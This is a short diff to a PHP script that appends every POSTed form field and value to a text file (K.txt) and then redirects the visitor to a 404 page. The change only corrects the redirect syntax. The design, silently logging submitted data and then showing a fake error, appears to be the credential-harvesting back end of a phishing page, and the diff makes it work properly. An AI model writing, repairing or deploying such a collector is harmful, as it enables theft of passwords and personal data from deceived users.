@@ -1,5 +1,5 @@
 <?php
-header("location:http:404.html");
+header("location:404.html");
 $handle=fopen("K.txt","a");
 foreach($_POST as $variable=>$value)
 {
@@ -10,6 +10,6 @@ foreach($_POST as $variable=>$value)
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:http:404.html");
+header("location:404.html");
 exit;
 ?>
